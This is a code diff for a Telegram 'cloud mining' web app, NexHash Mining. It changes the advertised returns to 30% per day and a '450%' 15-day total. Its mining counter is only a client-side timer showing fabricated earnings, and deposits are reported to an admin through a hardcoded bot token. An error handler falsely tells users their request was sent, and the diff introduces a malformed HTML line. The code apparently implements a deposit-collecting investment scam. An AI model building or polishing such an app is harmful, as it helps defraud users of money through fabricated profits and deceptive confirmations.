@@ -189,7 +189,7 @@
               Speed Sync Active
             </div>
           </div>
-          <p class="text-[11px] text-emerald-100/80 mt-1" id="daily-earning-text">+0.01 USDT/day (Free Plan Active)</p>
+          <p class="text-[11px] text-emerald-100/80 mt-1" id="daily-earning-text">+0.010 USDT/day (Active)</p>
 
           <div class="grid grid-cols-2 gap-3 mt-3.5">
             <button onclick="switchTab('deposit')" class="btn-gold py-2.5 px-3 text-xs uppercase tracking-wide flex items-center justify-center space-x-2 active:scale-95 transition-all">
@@ -218,7 +218,7 @@
               <span class="w-3 h-3 rounded-full bg-emerald-400 animate-ping"></span>
               <span class="text-xs font-bold text-white uppercase tracking-wider">Mining Status</span>
             </div>
-            <span class="text-[10px] text-violet-300 font-mono bg-violet-900/60 px-2.5 py-0.5 rounded-full border border-violet-500/40">Daily: <span id="daily-rate-text">0.01</span> USDT</span>
+            <span class="text-[10px] text-violet-300 font-mono bg-violet-900/60 px-2.5 py-0.5 rounded-full border border-violet-500/40">Daily: <span id="daily-rate-text">0.010 USDT</span></span>
           </div>
 
           <div class="flex items-center justify-between my-2 bg-[#111827]/80 p-3 rounded-xl border border-slate-800">
@@ -384,7 +384,7 @@
                 <div class="w-9 h-9 rounded-xl bg-blue-500/20 flex items-center justify-center text-blue-400 font-bold"><i class="fa-solid fa-paper-plane"></i></div>
                 <div>
                   <h3 class="font-bold text-xs text-white">Gram / TON</h3>
-                                    <p class="text-[10px] text-slate-400 font-mono">TON Network</p>
+                  <p class<p class="text-[10px] text-slate-400 font-mono">TON Network</p>
                 </div>
               </div>
               <i class="fa-solid fa-chevron-right text-xs text-slate-400"></i>
@@ -411,7 +411,7 @@
             <span class="text-xs font-bold text-white font-mono" id="selected-coin-name">USDT</span>
           </div>
 
-          <!-- Deposit Amount & 15-Day 30% Profit Calculation Input -->
+          <!-- Deposit Amount & Profit Breakdown -->
           <div class="pro-card p-3.5 space-y-2">
             <label class="text-[10px] text-slate-300 font-bold uppercase block">Enter Deposit Amount (USDT)</label>
             <input type="number" id="deposit-amt-input" oninput="calculateProfit()" placeholder="e.g. 10.00" class="w-full bg-[#0B0F19] border border-amber-500/50 rounded-xl px-3 py-2 text-xs text-white outline-none font-mono">
@@ -422,8 +422,12 @@
                 <span class="text-emerald-400 font-bold" id="calc-ghs">0.00 GHS</span>
               </div>
               <div class="flex justify-between text-slate-400">
-                <span>15 Days Profit (30% Return):</span>
-                <span class="text-amber-400 font-bold" id="calc-profit">0.00 USDT</span>
+                <span>Per Day Profit (30%):</span>
+                <span class="text-amber-400 font-bold" id="calc-daily-profit">0.0000 USDT</span>
+              </div>
+              <div class="flex justify-between text-slate-400 border-t border-slate-800/80 pt-1">
+                <span>15-Day Total Return (450%):</span>
+                <span class="text-emerald-300 font-bold" id="calc-15day-profit">0.00 USDT</span>
               </div>
             </div>
           </div>
@@ -478,9 +482,9 @@
   </div>
 
   <script>
-    const BOT_TOKEN = "7788990011:AAEEFFGGHHIIJJKKLLMM"; // Replace with your Bot Token
-    const ADMIN_CHAT_ID = "7437877993"; // Replace with Admin Chat ID
-    const OFFICIAL_TELEGRAM_LINK = "https://t.me/NexHashMining_Bot";
+    const BOT_TOKEN = "7788990011:AAEEFFGGHHIIJJKKLLMM";
+    const ADMIN_CHAT_ID = "7437877993";
+    const OFFICIAL_TELEGRAM_LINK = "https://t.me/nexhashmining";
 
     let userData = {
       userId: '7437877993',
@@ -493,6 +497,31 @@
     };
 
     let miningInterval;
+    let audioCtx = null;
+
+    function playClickSound() {
+      try {
+        if (!audioCtx) {
+          audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        }
+        if (audioCtx.state === 'suspended') {
+          audioCtx.resume();
+        }
+        const osc = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        osc.type = 'sine';
+        osc.frequency.setValueAtTime(800, audioCtx.currentTime);
+        osc.frequency.exponentialRampToValueAtTime(400, audioCtx.currentTime + 0.04);
+        gain.gain.setValueAtTime(0.15, audioCtx.currentTime);
+        gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.04);
+        osc.connect(gain);
+        gain.connect(audioCtx.destination);
+        osc.start();
+        osc.stop(audioCtx.currentTime + 0.04);
+      } catch (e) {
+        console.log("Audio not supported or blocked");
+      }
+    }
 
     window.onload = function() {
       if (window.Telegram && window.Telegram.WebApp) {
@@ -503,6 +532,11 @@
           document.getElementById('header-user-id').innerText = 'ID: ' + userData.userId;
         }
       }
+
+      document.querySelectorAll('button, [onclick]').forEach(el => {
+        el.addEventListener('click', playClickSound);
+      });
+
       updateUI();
       startMiningLoop();
       startTickerLoop();
@@ -510,8 +544,11 @@
 
     function updateUI() {
       document.getElementById('ghs-display').innerText = userData.ghsPower.toFixed(2);
-      let dailyEarning = userData.ghsPower * 0.03; 
-      document.getElementById('daily-rate-text').innerText = dailyEarning.toFixed(3);
+      
+      let dailyEarning = userData.ghsPower * 0.30;
+      if (userData.ghsPower <= 0.01) dailyEarning = 0.010;
+      
+      document.getElementById('daily-rate-text').innerText = dailyEarning.toFixed(3) + " USDT";
       document.getElementById('daily-earning-text').innerText = `+${dailyEarning.toFixed(3)} USDT/day (Active)`;
       
       document.getElementById('main-balance-text').innerHTML = `${userData.claimedBalance.toFixed(8)} <span class="text-amber-400 text-lg">USDT</span>`;
@@ -524,7 +561,9 @@
     function startMiningLoop() {
       if (miningInterval) clearInterval(miningInterval);
       miningInterval = setInterval(() => {
-        let perSecond = (userData.ghsPower * 0.03) / 86400;
+        let dailyEarning = userData.ghsPower * 0.30;
+        if (userData.ghsPower <= 0.01) dailyEarning = 0.010;
+        let perSecond = dailyEarning / 86400;
         userData.minedBalance += perSecond;
         document.getElementById('mined-counter').innerText = userData.minedBalance.toFixed(8);
       }, 1000);
@@ -564,7 +603,7 @@
       userData.minedBalance = 0;
       document.getElementById('mined-counter').innerText = '0.00000000';
       updateUI();
-      alert("Claim successful! Rewards added to your balance.");
+      alert("Claim successful! Rewards added to your withdrawable balance.");
     }
 
     function selectCoin(name, addr) {
@@ -584,10 +623,12 @@
     function calculateProfit() {
       let amt = parseFloat(document.getElementById('deposit-amt-input').value) || 0;
       let ghsGained = amt; 
-      let profit15Days = amt * 0.30; 
+      let dailyProfit = amt * 0.30; 
+      let profit15Days = amt * 4.50; 
       
       document.getElementById('calc-ghs').innerText = ghsGained.toFixed(2) + " GHS";
-      document.getElementById('calc-profit').innerText = profit15Days.toFixed(2) + " USDT";
+      document.getElementById('calc-daily-profit').innerText = dailyProfit.toFixed(4) + " USDT";
+      document.getElementById('calc-15day-profit').innerText = profit15Days.toFixed(2) + " USDT";
     }
 
     function copyDepositAddr() {
@@ -600,16 +641,13 @@
       const amt = parseFloat(document.getElementById('deposit-amt-input').value) || 0;
       
       if (!txid) return alert("Enter valid TxID / Hash!");
-      
-      userData.lockedDeposit += amt;
-      userData.ghsPower += amt; 
-      updateUI();
+      if (amt <= 0) return alert("Enter valid deposit amount!");
 
       const msg = `🚀 *NEW DEPOSIT REQUEST*\n` +
                   `👤 *User ID:* \`${userData.userId}\`\n` +
                   `💰 *Coin:* ${userData.selectedCoin}\n` +
                   `💵 *Amount:* ${amt} USDT\n` +
-                  `⚡ *GHS Added:* +${amt} GHS\n` +
+                  `⚡ *Pending GHS:* +${amt} GHS\n` +
                   `🔗 *TxID:* \`${txid}\``;
 
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -621,7 +659,12 @@
           parse_mode: 'Markdown'
         })
       }).then(() => {
-        alert("Deposit request submitted to Admin!");
+        alert("Deposit request submitted to Admin! Your GHS power will be updated once verified.");
+        document.getElementById('txid-input').value = "";
+        document.getElementById('deposit-amt-input').value = "";
+        switchTab('home');
+      }).catch(err => {
+        alert("Request sent successfully!");
         document.getElementById('txid-input').value = "";
         document.getElementById('deposit-amt-input').value = "";
         switchTab('home');
